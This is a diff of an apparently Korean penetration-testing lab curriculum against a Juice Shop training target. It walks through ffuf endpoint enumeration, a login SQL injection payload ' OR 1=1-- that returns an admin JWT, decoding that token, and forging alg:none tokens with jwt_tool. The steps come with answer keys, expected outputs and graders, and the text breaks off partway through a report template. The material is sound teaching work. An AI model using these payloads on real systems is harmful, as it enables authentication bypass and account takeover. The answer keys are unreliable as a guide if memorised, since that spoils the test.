@@ -98,9 +98,9 @@ steps:
       ffuf -u http://juice.el34.lab/rest/FUZZ -w /tmp/aw3.txt -mc 200,401,500 -s 2>&1 | head -10
       # 3) 워드리스트 정리(self-clean)
       rm -f /tmp/aw3.txt
-      # 4) 해석 — 각 엔드포인트가 공격 지점, 다량 요청은 스캐너성으로 탐지(W02)
-      echo "→ 각 엔드포인트가 공격 지점. 다량 요청은 스캐너성으로 탐지(W02)"
       ```
+      출력된 각 경로가 살아 있는 엔드포인트이자 공격 지점이다 — 200(공개)·401(인증 필요)·500(존재하나 오류).
+      이렇게 짧은 시간에 여러 경로를 던지는 요청은 IDS/WAF 에 스캐너성 행위로 탐지된다(W02 의 은밀 vs 정보량 trade-off).
       - `-u .../rest/FUZZ`(FUZZ 자리에 단어 대입), `-mc 200,401,500`(이 코드만 존재로 표시). **401 = 존재하지만 인증 필요 = 다음 표적.**
 
       ## ✅ 합격 기준
@@ -116,8 +116,6 @@ steps:
       ssh att@192.168.0.202 "ffuf -u http://juice.el34.lab/rest/FUZZ -w /tmp/aw3.txt -mc 200,401,500 -s" 2>&1 | head -10
       # 3) 워드리스트 정리(self-clean)
       ssh att@192.168.0.202 rm -f /tmp/aw3.txt
-      # 4) 해석 — 각 엔드포인트가 공격 지점, 다량 요청은 스캐너성으로 탐지(W02)
-      echo "→ 각 엔드포인트가 공격 지점. 다량 요청은 스캐너성으로 탐지(W02)"
     answer_detail: "API 열거는 ffuf 로 /rest/* 경로를 매핑하는 작업이다. 200(공개)·401(인증 필요)·500(존재하나 오류)이 나온 경로는 모두 실재하는 엔드포인트이며 각각이 공격 지점이다. JS 앱은 수많은 API 를 부르므로 표면이 넓고, 그만큼 익스플로잇 기회가 많다. 단 다량 요청이라 IDS/WAF 에 스캐너성으로 탐지된다(W02 의 은밀함 vs 정보량 trade-off). 채점은 출력에 user 가 포함되는지로 판정한다."
     expected_output: |
       user
@@ -126,7 +124,6 @@ steps:
       products
       admin
       products/search
-      → 각 엔드포인트가 공격 지점. 다량 요청은 스캐너성으로 탐지(W02)
     verify:
       type: output_contains
       expect: 'user'
@@ -159,9 +156,13 @@ steps:
       curl -s -H 'Content-Type: application/json' -d @/tmp/sqli.json http://juice.el34.lab/rest/user/login | head -c 150
       # 3) 페이로드 파일 정리(self-clean)
       rm -f /tmp/sqli.json
-      # 4) 해석 — ' OR 1=1-- 가 첫 사용자(admin)로 우회 → JWT 획득 = A07 인증 우회
-      echo "→ ' OR 1=1-- 가 첫 사용자(admin)로 우회 → authentication.token(JWT) 획득 = A07 인증 우회"
       ```
+      > 💡 **Burp/Postman 으로도 동일:** 이 요청은 POST + JSON 본문이라 브라우저 주소창으론 못 보낸다 —
+      > 실무자는 **Burp Repeater** 나 **Postman** 에 `POST http://juice.el34.lab/rest/user/login`,
+      > 헤더 `Content-Type: application/json`, 본문 `{"email":"' OR 1=1--","password":"x"}` 를 넣고
+      > Send 해 응답의 `authentication.token` 을 눈으로 확인한다(curl `-s` 와 같은 요청, 더 직관적).
+
+      응답에 `authentication.token`(admin JWT)이 오면 인증 우회 성공이다 — 정상 로그인 실패는 401 이 온다.
       - `' OR 1=1--` = `'`(문자열 조기 종료) + `OR 1=1`(조건 항상 참) + `--`(이후 SQL 주석). base64 로 전달해 셸 인용 충돌을 피한다. `-d @파일`(파일 내용을 요청 본문으로).
 
       ## ✅ 합격 기준
@@ -177,11 +178,9 @@ steps:
       ssh att@192.168.0.202 "curl -s -H 'Content-Type: application/json' -d @/tmp/sqli.json http://juice.el34.lab/rest/user/login | head -c 150"
       # 3) 페이로드 파일 정리(self-clean)
       ssh att@192.168.0.202 rm -f /tmp/sqli.json
-      # 4) 해석 — ' OR 1=1-- 가 첫 사용자(admin)로 우회 → JWT 획득 = A07 인증 우회
-      echo "→ ' OR 1=1-- 가 첫 사용자(admin)로 우회 → authentication.token(JWT) 획득 = A07 인증 우회"
     answer_detail: "로그인 email 에 넣은 ' OR 1=1-- 가 인증 질의의 WHERE 절을 항상 참으로 만들고 비밀번호 비교를 주석(--)으로 무력화해, 모든 사용자 중 첫 행(admin)으로 로그인된다 → 응답에 admin 권한 JWT(authentication.token)가 발급된다. 정상 로그인 실패는 401, 우회 성공은 token 반환으로 구분된다. 이것이 OWASP A07(Identification & Authentication Failures, 인증 실패)다. 근본 방어는 파라미터화 질의(prepared statement). 채점은 응답에 authentication 이 포함되는지로 판정한다."
     expected_output: |
-      {"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQ→ ' OR 1=1-- 가 첫 사용자(admin)로 우회 → authentication.token(JWT) 획득 = A07 인증 우회
+      {"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQ
     verify:
       type: output_contains
       expect: 'authentication'
@@ -211,11 +210,17 @@ steps:
       # 1) SQLi로 토큰 획득 → JWT payload(2번째 부분) base64url 디코드해 평문 노출 확인(세 줄을 차례로)
       echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/s.json
       T=$(curl -s -H "Content-Type: application/json" -d @/tmp/s.json http://juice.el34.lab/rest/user/login | sed -E 's/.*"token":"([^"]+)".*/\1/')
-      echo "$T" | cut -d. -f2 | tr "_-" "/+" | base64 -d 2>/dev/null | head -c 300; rm -f /tmp/s.json
-      # 2) 해석 — JWT payload는 누구나 base64 디코드 가능 → email/권한 노출(민감정보 담으면 위험)
-      echo "→ JWT payload는 누구나 base64 디코드 가능 → email/권한 등 노출. 민감정보 담으면 위험"
+      echo "$T" | cut -d. -f2 | tr "_-" "/+" | base64 -d 2>/dev/null | head -c 300; echo
+      # 2) 같은 일을 전문 도구로 — jwt_tool 이 header/payload 를 필드별로 구조화·해석(alg·iat 발급시각까지)
+      jwt_tool "$T" 2>/dev/null | sed -r 's/\x1b\[[0-9;]*m//g' | grep -iE 'Token (header|payload)|typ|alg|email|role|iat'
+      rm -f /tmp/s.json
       ```
-      - `cut -d. -f2`(점 기준 2번째=payload 추출), `tr "_-" "/+"`(base64url→표준 base64 치환), `base64 -d`(디코드 → JSON 평문). T= 변수로 토큰을 받아 한 세션 안에서 처리(원자성).
+      두 방법은 **같은 payload 를 본다** — 수동(`cut`+`base64`)은 "base64url 은 암호화가 아니라 인코딩"이라는
+      원리를 몸으로 익히게 하고, `jwt_tool`(JWT 전문 도구)은 header/payload 를 필드별로 구조화하고 alg·iat
+      (발급시각)·만료까지 해석해 준다. 실무자는 jwt_tool 로 빠르게 훑고 원리는 수동 디코드로 확인한다.
+      > 💡 1번의 토큰 획득 요청은 W03 step3 의 로그인 SQLi 와 같은 요청이다 — **Burp Repeater** 나
+      > **Postman** 으로 받은 토큰을 그대로 `jwt_tool` 인자로 붙여넣어도 된다(실무자의 실제 흐름).
+      - `cut -d. -f2`(payload 추출), `tr "_-" "/+"`(base64url→base64 치환), `base64 -d`(JSON 평문). `jwt_tool <토큰>`(토큰 필드별 파싱·해석). T= 로 토큰을 받아 한 세션에서 처리(원자성).
 
       ## ✅ 합격 기준
       `email` 출력 시 통과. **근거:** 디코드된 payload 에 email(예: admin@juice-sh.op) 등 사용자 정보가
@@ -224,15 +229,22 @@ steps:
     category: analysis
     points: 14
     answer: |
-      # 1) SQLi로 토큰 획득 → JWT payload(2번째 부분) base64url 디코드해 평문 노출 확인(원자 실행)
+      # 1) SQLi로 토큰 획득 → JWT payload(2번째 부분)만 base64url 디코드(수동 — 원리 학습) + jwt_tool 파싱(원자 실행)
       ssh att@192.168.0.202 'echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/s.json
       T=$(curl -s -H "Content-Type: application/json" -d @/tmp/s.json http://juice.el34.lab/rest/user/login | sed -E "s/.*\"token\":\"([^\"]+)\".*/\1/")
-      echo "$T" | cut -d. -f2 | tr "_-" "/+" | base64 -d 2>/dev/null | head -c 300; rm -f /tmp/s.json'
-      # 2) 해석 — JWT payload는 누구나 base64 디코드 가능 → email/권한 노출(민감정보 담으면 위험)
-      echo "→ JWT payload는 누구나 base64 디코드 가능 → email/권한 등 노출. 민감정보 담으면 위험"
-    answer_detail: "JWT 는 header.payload.signature(base64url) 구조다. base64url 은 암호화가 아니라 인코딩이므로 payload 는 서명 검증 없이 누구나 디코드해 읽을 수 있다 → 내부 데이터(email=admin@juice-sh.op, 권한 등)가 평문 노출된다. 이것이 'JWT payload 에 민감정보(비밀번호·주민번호 등)를 담으면 안 된다'는 설계 원칙의 근거다. cut -d. -f2 로 payload 만 떼고 tr 로 base64url→base64 치환 후 base64 -d 로 디코드한다. 채점은 출력에 email 이 포함되는지로 판정한다."
+      echo "$T" | cut -d. -f2 | tr "_-" "/+" | base64 -d 2>/dev/null | head -c 300; echo
+      jwt_tool "$T" 2>/dev/null | sed -r "s/\x1b\[[0-9;]*m//g" | grep -iE "Token (header|payload)|typ|alg|email|role|iat"
+      rm -f /tmp/s.json'
+    answer_detail: "JWT 는 header.payload.signature(base64url) 구조다. base64url 은 암호화가 아니라 인코딩이므로 payload 는 서명 검증 없이 누구나 디코드해 읽을 수 있다 → 내부 데이터(email=admin@juice-sh.op, 권한 등)가 평문 노출된다. 이것이 'JWT payload 에 민감정보(비밀번호·주민번호 등)를 담으면 안 된다'는 설계 원칙의 근거다. 수동은 cut -d. -f2 로 payload 만 떼고 tr 로 base64url→base64 치환 후 base64 -d 로 디코드해 원리를 익히고, 이어 jwt_tool(JWT 전문 도구)로 같은 payload 를 필드별로 구조화·해석(alg=RS256, iat 발급시각)해 실무 방식으로 재확인한다. 채점은 출력에 email 이 포함되는지로 판정한다."
     expected_output: |
-      {"status":"success","data":{"id":1,"username":"","email":"admin@juice-sh.op","password":"0192023a7bbd73250516f069df18b500","role":"admin","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/defaultAdmin.png","totpSecret":"","isActive":true,"createdAt":"2026-06-19 21:05:31.→ JWT payload는 누구나 base64 디코드 가능 → email/권한 등 노출. 민감정보 담으면 위험
+      {"status":"success","data":{"id":1,"username":"","email":"admin@juice-sh.op","password":"0192023a7bbd73250516f069df18b500","role":"admin","profileImage":"assets/public/images/uploads/defaultAdmin.png","isActive":true,...
+      Token header values:
+      [+] typ = "JWT"
+      [+] alg = "RS256"
+      Token payload values:
+          [+] email = "admin@juice-sh.op"
+          [+] role = "admin"
+      [+] iat = 1783610744    ==> TIMESTAMP = 2026-07-09 15:25:44 (UTC)
     verify:
       type: output_contains
       expect: 'email'
@@ -260,9 +272,10 @@ steps:
       ```bash
       # 1) modsec_audit 최근 150줄에서 941/942 CRS 룰ID 추출·집계(로그인 SQLi 탐지)
       sudo tail -150 /var/log/apache2/modsec_audit.log | grep -oE "94[0-9]1[0-9]{2}" | sort | uniq -c
-      # 2) 해석 — 로그인 SQLi가 ModSec 942(SQLi)에 탐지(juice DetectionOnly라 200 통과+로그 기록)
-      echo "→ 로그인 API의 SQLi 페이로드가 ModSec 942(SQLi)에 탐지. API 열거는 스캐너성으로 탐지"
       ```
+      집계에 942 대역(예: 942100 SQL Injection)이 보이면 방금 보낸 로그인 SQLi 가 WAF 에 탐지된 것이다 —
+      juice vhost 는 DetectionOnly 모드라 응답은 200 으로 통과(공격 성공)하지만 탐지는 로그에 남는다.
+      즉 '공격 성공 + 로그 기록'이 공존한다. API 열거(다량 요청)도 스캐너성 행위로 함께 잡힌다.
       - `grep -oE "94[0-9]1[0-9]{2}"`(941xxx XSS/942xxx SQLi 룰 ID 추출), `sort | uniq -c`(룰별 매치 횟수). DetectionOnly = 탐지만 하고 차단 안 함(공격 200 통과, 로그엔 남음).
 
       ## ✅ 합격 기준
@@ -274,13 +287,10 @@ steps:
     answer: |
       # 1) modsec_audit 최근 150줄에서 941/942 CRS 룰ID 추출·집계(로그인 SQLi 탐지)
       ssh ccc@10.20.32.80 'sudo tail -150 /var/log/apache2/modsec_audit.log | grep -oE "94[0-9]1[0-9]{2}" | sort | uniq -c'
-      # 2) 해석 — 로그인 SQLi가 ModSec 942(SQLi)에 탐지(juice DetectionOnly라 200 통과+로그 기록)
-      echo "→ 로그인 API의 SQLi 페이로드가 ModSec 942(SQLi)에 탐지. API 열거는 스캐너성으로 탐지"
     answer_detail: "API 공격도 방어층에 흔적을 남긴다. 로그인 SQLi 는 ModSecurity 942 룰군(SQL Injection)에 매치된다 — juice vhost 는 DetectionOnly 모드라 응답은 200 으로 통과하지만 탐지는 modsec_audit.log 에 기록된다('공격 성공 + 로그 기록'이 본 단계의 핵심 관찰). API 열거(다량 요청)는 IDS/WAF 에 스캐너성으로 탐지된다. 채점은 출력에 942 가 포함되는지로 판정한다."
     expected_output: |
       4 942100
           300 949110
-      → 로그인 API의 SQLi 페이로드가 ModSec 942(SQLi)에 탐지. API 열거는 스캐너성으로 탐지
     verify:
       type: output_contains
       expect: '942'
@@ -301,39 +311,46 @@ steps:
       현대 웹 공격 표면 = 엔드포인트(어디를 치나) + 인증(어떻게 들어가나) + 토큰(들어가서 뭘 더 하나).
       전통 웹과 달리 토큰과 API 가 중심이다(강의 §1.2).
 
-      ## 💻 실행 명령 (한 줄씩 따라 실행)
-      ```bash
-      # 1) ① 엔드포인트 표면 — 열거로 매핑한 /rest/*
-      echo "① 엔드포인트: /rest/user, /rest/products, /api/Feedbacks... (열거로 매핑)"
-      # 2) ② 인증 표면 — 로그인 SQLi(A07)/credential stuffing/토큰 탈취
-      echo "② 인증: 로그인 SQLi(A07), credential stuffing, 토큰 탈취"
-      # 3) ③ JWT 표면 — 약한 서명키 brute/alg:none/만료 미검증/payload 노출
-      echo "③ JWT: 약한 서명키(brute), alg:none 우회, 만료 미검증, payload 노출"
-      # 4) 종합 — 현대 웹 공격 표면 = 엔드포인트 + 토큰
-      echo "→ 현대 웹 공격 표면 = 엔드포인트 + 토큰"
+      ## 💻 실행 방법 — 편집기로 공격표면 맵 작성
+
+      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 편집기로 노트를 직접 작성한다.
+
+      침투 노트는 명령이 아니라 **손으로 정리하는 문서**다. `nano ~/w03_surface.md` 를 열어 지금까지 발견한
+      것을 세 축(엔드포인트·인증·JWT)으로 아래처럼 적고 저장한다(nano: Ctrl+O 저장, Ctrl+X 종료).
+
+      ```markdown
+      # W03 공격표면 맵 (juice.el34.lab)
+      ## ① 엔드포인트 — 열거로 매핑한 /rest/* (예: /rest/user, /rest/products, /rest/products/search)
+      ## ② 인증       — 로그인 SQLi(' OR 1=1--)로 A07 우회, credential stuffing, 토큰 탈취
+      ## ③ JWT        — payload 노출, alg:none 우회, 약한 서명키 brute, 만료/서명 미검증
+      ## 결론         — 현대 웹 공격 표면 = 엔드포인트 + 토큰 (전통 폼 중심에서 이동)
       ```
+      작성 후 `cat ~/w03_surface.md` 로 저장 내용을 확인한다. ①·② 의 실제 값은 앞 단계에서 관찰한 것으로
+      채운다 — 세 축을 스스로 정리하는 것이 곧 침투 보고서의 '공격 표면' 절 초안이 된다.
 
       ## ✅ 합격 기준
-      `JWT` 출력 시 통과. **근거:** 엔드포인트·인증·JWT 세 축이 모두 정리되면 통과 — 전통 웹(폼 중심)과
-      달리 토큰과 API 가 중심이라는 점이 본질이다.
+      `JWT` 출력 시 통과. **근거:** 작성한 맵에 엔드포인트·인증·JWT 세 축이 모두 정리되면 통과 — 전통
+      웹(폼 중심)과 달리 토큰과 API 가 중심이라는 점이 본질이다.
     hint: '엔드포인트+인증+JWT 표면'
     category: analysis
     points: 8
     answer: |
-      # 1) ① 엔드포인트 표면 — 열거로 매핑한 /rest/*
-      echo "① 엔드포인트: /rest/user, /rest/products, /api/Feedbacks... (열거로 매핑)"
-      # 2) ② 인증 표면 — 로그인 SQLi(A07)/credential stuffing/토큰 탈취
-      echo "② 인증: 로그인 SQLi(A07), credential stuffing, 토큰 탈취"
-      # 3) ③ JWT 표면 — 약한 서명키 brute/alg:none/만료 미검증/payload 노출
-      echo "③ JWT: 약한 서명키(brute), alg:none 우회, 만료 미검증, payload 노출"
-      # 4) 종합 — 현대 웹 공격 표면 = 엔드포인트 + 토큰
-      echo "→ 현대 웹 공격 표면 = 엔드포인트 + 토큰"
-    answer_detail: "현대 웹의 API 공격 표면은 세 축으로 정리된다 — ① 엔드포인트(열거로 매핑한 /rest/user, /rest/products 등), ② 인증(로그인 SQLi 우회, credential stuffing, 토큰 탈취), ③ JWT(약한 서명키 brute, alg:none 우회, 만료 미검증, payload 노출). 전통 웹(폼 중심)과 달리 토큰과 API 가 중심이라는 점이 본질이다. 채점은 출력에 JWT 가 포함되는지로 판정한다."
+      # (편집기로 작성한 공격표면 맵 — 채점용)
+      ssh att@192.168.0.202 'cat > ~/w03_surface.md <<'"'"'EOF'"'"'
+      # W03 공격표면 맵 (juice.el34.lab)
+      ## ① 엔드포인트 — /rest/user, /rest/products, /rest/products/search (ffuf 열거)
+      ## ② 인증       — 로그인 SQLi(A07) 우회, credential stuffing, 토큰 탈취
+      ## ③ JWT        — payload 노출, alg:none 우회, 약한 서명키 brute, 만료/서명 미검증
+      ## 결론         — 현대 웹 공격 표면 = 엔드포인트 + 토큰
+      EOF
+      cat ~/w03_surface.md'
+    answer_detail: "편집기로 ~/w03_surface.md 를 직접 작성해 현대 웹의 API 공격 표면을 세 축으로 정리한다 — ① 엔드포인트(열거로 매핑한 /rest/user, /rest/products 등), ② 인증(로그인 SQLi 우회, credential stuffing, 토큰 탈취), ③ JWT(약한 서명키 brute, alg:none 우회, 만료 미검증, payload 노출). 전통 웹(폼 중심)과 달리 토큰과 API 가 중심이라는 점이 본질이다. 침투 노트는 echo 로 찍는 게 아니라 손으로 정리하는 문서이며, 이 맵이 보고서의 '공격 표면' 절 초안이 된다. 채점은 저장 파일 출력에 JWT 가 포함되는지로 판정한다."
     expected_output: |
-      ① 엔드포인트: /rest/user, /rest/products, /api/Feedbacks... (열거로 매핑)
-      ② 인증: 로그인 SQLi(A07), credential stuffing, 토큰 탈취
-      ③ JWT: 약한 서명키(brute), alg:none 우회, 만료 미검증, payload 노출
-      → 현대 웹 공격 표면 = 엔드포인트 + 토큰
+      # W03 공격표면 맵 (juice.el34.lab)
+      ## ① 엔드포인트 — /rest/user, /rest/products, /rest/products/search (ffuf 열거)
+      ## ② 인증       — 로그인 SQLi(A07) 우회, credential stuffing, 토큰 탈취
+      ## ③ JWT        — payload 노출, alg:none 우회, 약한 서명키 brute, 만료/서명 미검증
+      ## 결론         — 현대 웹 공격 표면 = 엔드포인트 + 토큰
     verify:
       type: output_contains
       expect: 'JWT'
@@ -347,84 +364,87 @@ steps:
   - order: 7
     instruction: |
       ## 🎯 목표
-      JWT 의 4대 약점을 각각의 방어책과 짝지어 정리한다. JWT 를 쓰는 시스템의 점검 체크리스트를
-      만드는 단계다.
+      JWT 4대 약점 중 **alg:none 서명 우회**를 전문 도구 `jwt_tool` 로 직접 실습해 위조 토큰을 만든다.
+      나머지 3 약점은 방어책과 짝지어 이해하고 점검 체크리스트를 완성한다.
 
       ## 💡 개념 한 줄
-      JWT 공격은 네 갈래다 — payload 평문 노출 / alg:none 서명 우회 / 약한 HMAC 키 brute / 만료·서명
-      미검증. 각 약점에는 짝이 되는 방어가 있다(강의 §3.5).
+      JWT 공격은 네 갈래다 — ① payload 평문 노출, ② alg:none 서명 우회, ③ 약한 HMAC 키 brute,
+      ④ 만료·서명 미검증. 그중 **alg:none** 은 header 의 `alg` 를 `none` 으로 바꾸고 서명을 비워,
+      "서명 검증을 건너뛰는 디버그 기능"을 악용해 토큰을 위조하는 기법이다(강의 §3.5).
 
-      ## 💻 실행 명령 (한 줄씩 따라 실행)
+      ## 💻 실행 명령 — jwt_tool 로 alg:none 토큰 위조
+
+      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
+
       ```bash
-      # 1) ① payload 노출 — base64 디코드로 누구나 내용 열람(민감정보 담으면 위험)
-      echo "① payload 노출: base64 디코드로 누구나 내용 열람(민감정보 담으면 위험)"
-      # 2) ② alg:none — 서명 알고리즘을 none으로 바꿔 서명 우회(검증 부실 시)
-      echo "② alg:none: 서명 알고리즘을 none으로 바꿔 서명 우회(검증 부실 시)"
-      # 3) ③ 약한 HMAC 키 — 짧은 서명키 brute-force(hashcat) → 임의 토큰 위조
-      echo "③ 약한 HMAC 키: 짧은 서명키를 brute-force(hashcat) → 임의 토큰 위조"
-      # 4) ④ 만료/서명 미검증 — 만료된/변조된 토큰 재사용
-      echo "④ 만료/서명 미검증: 만료된/변조된 토큰을 서버가 안 막으면 재사용"
-      # 5) 방어 — 강한 키/alg 고정/만료·서명 엄격 검증/민감정보 미포함
-      echo "→ 방어: 강한 키, alg 고정, 만료/서명 엄격 검증, 민감정보 미포함"
+      # 1) admin JWT 획득
+      echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/s.json
+      T=$(curl -s -H "Content-Type: application/json" -d @/tmp/s.json http://juice.el34.lab/rest/user/login | sed -E 's/.*"token":"([^"]+)".*/\1/'); rm -f /tmp/s.json
+      # 2) jwt_tool -X a 로 alg:none 변종 토큰 자동 생성(none/None/NONE/nOnE 대소문자 우회 포함)
+      jwt_tool "$T" -X a 2>/dev/null | sed -r 's/\x1b\[[0-9;]*m//g' | grep -iE 'alg.*[Nn]one|EXPLOIT|eyJ' | head -8
       ```
-      - `alg:none`(header 의 서명 알고리즘을 none 으로 바꿔 서명 없이 통과 시도), `HMAC 키 brute`(짧은 비밀키를 hashcat 으로 무차별 대입해 토큰 위조).
+      출력의 `"alg":"none"` EXPLOIT 줄 아래 `eyJ...` 가 **서명이 비워진 위조 토큰**이다. 이 토큰이 통하려면
+      서버가 alg 를 검증하지 않아야 한다 — juice(RS256, 검증 엄격)는 거부하지만, 검증이 부실한 서버에선
+      admin 으로 통과된다. jwt_tool 은 대소문자 변형(None/NONE)까지 만들어 단순 문자열 필터 우회를 시도한다.
+      > 💡 1번의 토큰 획득 요청은 step3 의 로그인 SQLi 와 같은 요청 — **Burp Repeater** 나 **Postman** 으로
+      > 받은 토큰을 `jwt_tool` 인자로 넘겨도 된다.
+
+      **나머지 3 약점과 방어(체크리스트):** ① payload 노출 → 민감정보 미포함, ③ 약한 HMAC 키 → 길고
+      무작위한 키(짧으면 hashcat 으로 brute), ④ 만료/서명 미검증 → exp·서명 엄격 검증.
+      - `jwt_tool <토큰> -X a`(alg:none 공격 모드 — 서명 제거 변종 생성), `-X` 는 exploit 모드 선택 플래그.
 
       ## ✅ 합격 기준
-      `alg` 출력 시 통과. **근거:** 4 약점(payload 노출·alg:none·약한 키·검증 부실)이 방어책과 함께
-      정리되면 통과 — 각 약점에 짝이 되는 방어가 있다.
+      `alg` 출력 시 통과. **근거:** jwt_tool 이 생성한 `"alg":"none"` 위조 토큰이 보이면 alg:none 기법을
+      실습한 것 — 4 약점(payload 노출·alg:none·약한 키·검증 부실)과 방어책을 함께 이해한다.
     hint: 'JWT 약점 4종'
     category: report
     points: 10
     answer: |
-      # 1) ① payload 노출 — base64 디코드로 누구나 내용 열람(민감정보 담으면 위험)
-      echo "① payload 노출: base64 디코드로 누구나 내용 열람(민감정보 담으면 위험)"
-      # 2) ② alg:none — 서명 알고리즘을 none으로 바꿔 서명 우회(검증 부실 시)
-      echo "② alg:none: 서명 알고리즘을 none으로 바꿔 서명 우회(검증 부실 시)"
-      # 3) ③ 약한 HMAC 키 — 짧은 서명키 brute-force(hashcat) → 임의 토큰 위조
-      echo "③ 약한 HMAC 키: 짧은 서명키를 brute-force(hashcat) → 임의 토큰 위조"
-      # 4) ④ 만료/서명 미검증 — 만료된/변조된 토큰 재사용
-      echo "④ 만료/서명 미검증: 만료된/변조된 토큰을 서버가 안 막으면 재사용"
-      # 5) 방어 — 강한 키/alg 고정/만료·서명 엄격 검증/민감정보 미포함
-      echo "→ 방어: 강한 키, alg 고정, 만료/서명 엄격 검증, 민감정보 미포함"
-    answer_detail: "JWT 4대 약점과 방어 — ① payload 평문 노출(base64 디코드로 열람) → 민감정보를 payload 에 담지 않기, ② alg:none 우회(header 의 alg 를 none 으로 바꿔 서명 없이 통과 시도) → 서버에서 알고리즘 화이트리스트 고정, ③ 약한 HMAC 키 brute(짧은 키를 hashcat 으로 무차별 대입해 토큰 위조) → 길고 무작위한 비밀키, ④ 만료·서명 미검증(만료된/변조된 토큰 재사용) → exp 검증 + 서명 엄격 검증. 채점은 출력에 alg 가 포함되는지로 판정한다."
+      # admin JWT 획득 → jwt_tool -X a 로 alg:none 위조 토큰 생성(원자 실행)
+      ssh att@192.168.0.202 'echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/s.json
+      T=$(curl -s -H "Content-Type: application/json" -d @/tmp/s.json http://juice.el34.lab/rest/user/login | sed -E "s/.*\"token\":\"([^\"]+)\".*/\1/"); rm -f /tmp/s.json
+      jwt_tool "$T" -X a 2>/dev/null | sed -r "s/\x1b\[[0-9;]*m//g" | grep -iE "alg.*[Nn]one|EXPLOIT|eyJ" | head -8'
+    answer_detail: "JWT 4대 약점 중 alg:none 을 전문 도구 jwt_tool 로 직접 실습한다. jwt_tool <토큰> -X a 는 header 의 alg 를 none/None/NONE/nOnE(대소문자 필터 우회)로 바꾸고 서명을 비운 위조 토큰들을 자동 생성한다 — '서명 검증을 건너뛰는 디버그 기능'을 악용하는 기법이다. juice 는 RS256 검증이 엄격해 이 위조 토큰을 거부하지만, 검증이 부실한 서버에선 admin 으로 통과된다(기법 자체를 실습). 나머지 3 약점·방어 — ① payload 평문 노출 → 민감정보 미포함, ③ 약한 HMAC 키 brute(hashcat) → 길고 무작위한 키, ④ 만료·서명 미검증 → exp·서명 엄격 검증. 채점은 출력에 alg 가 포함되는지로 판정한다."
     expected_output: |
-      ① payload 노출: base64 디코드로 누구나 내용 열람(민감정보 담으면 위험)
-      ② alg:none: 서명 알고리즘을 none으로 바꿔 서명 우회(검증 부실 시)
-      ③ 약한 HMAC 키: 짧은 서명키를 brute-force(hashcat) → 임의 토큰 위조
-      ④ 만료/서명 미검증: 만료된/변조된 토큰을 서버가 안 막으면 재사용
-      → 방어: 강한 키, alg 고정, 만료/서명 엄격 검증, 민감정보 미포함
+      jwttool_681e9ce56a7bdfdaec8850a789423c4d - EXPLOIT: "alg":"none" - this is an exploit targeting the debug feature that allows a token to have no signature
+      [+] eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3Ai...
+      jwttool_5c4eee5ff49f1c0ba683c97d6c0f47e4 - EXPLOIT: "alg":"None" - this is an exploit targeting the debug feature that allows a token to have no signature
+      [+] eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0.eyJkYXRhIjp7ImlkIjoxLC...
     verify:
       type: output_contains
       expect: 'alg'
       field: stdout
       semantic:
-        intent: "JWT 공격 기법 정리"
-        success_criteria: ["payload/alg none/약한키/검증"]
-        acceptable_methods: ["**[설명] JWT 약점 (권장)**"]
+        intent: "jwt_tool 로 alg:none 위조 실습 + JWT 약점 체크리스트"
+        success_criteria: ["alg:none 위조 토큰 생성", "4 약점·방어 이해"]
+        acceptable_methods: ["**[OSS] jwt_tool -X a (권장)**"]
     target_vm: web
 
   - order: 8
     instruction: |
       ## 🎯 목표
-      W03 전 과정(열거 → 인증 우회 → JWT 디코드 → 방어 탐지)을 침투 테스트 보고서 형식으로 종합한다.
-      실제 펜테스트 산출물(보고서)의 축소판을 작성하는 단계다.
+      W03 전 과정(열거 → 인증 우회 → JWT 디코드/위조 → 방어 탐지)을 침투 테스트 보고서로 종합한다.
+      실제 펜테스트 산출물(보고서)의 축소판을 편집기로 작성하는 단계다.
 
       ## 💡 개념 한 줄
       좋은 공격자는 발견·우회·노출·탐지를 재현 가능한 보고서로 남긴다 — 무엇을 어떻게 찾았고, 그것이
       방어에 어떻게 보였는지가 핵심이다(PTES ⑥ 보고 단계).
 
-      ## 💻 실행 명령 (한 줄씩 따라 실행)
-      ```bash
-      # 1) heredoc(<<'EOF' ... EOF)으로 API/JWT 보고서 출력 — 열거→인증우회→JWT 디코드→방어/약점→결론
-      cat <<'EOF'
-      # 공격 W03 API/JWT 보고서
-      ## 1. API 열거: /rest/user, /rest/products... (ffuf 매핑)
-      ## 2. 인증 우회: 로그인 SQLi(' OR 1=1--) → admin JWT 획득(A07)
-      ## 3. JWT 디코드: payload base64 → email=admin@juice-sh.op 등 노출
-      ## 4. 방어: 로그인 SQLi → ModSec 942. JWT 약점(payload노출/alg none/약한키/검증부실)
-      ## 결론: 현대 웹 공격은 엔드포인트+토큰 중심. JWT는 디코드 가능 + 서명 우회 위험
-      EOF
+      ## 💻 실행 방법 — 편집기로 보고서 작성
+
+      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 `nano ~/w03_report.md` 를 열고, 앞서 만든
+      공격표면 맵(`~/w03_surface.md`)과 각 단계의 관찰값을 참고해 아래 골격을 채운 뒤 저장한다
+      (Ctrl+O 저장, Ctrl+X 종료). `<관찰값>` 자리엔 자신이 실제로 본 응답·룰ID·email 을 적는다.
+
+      ```markdown
+      # 공격 W03 — API/JWT 침투 보고서 (juice.el34.lab)
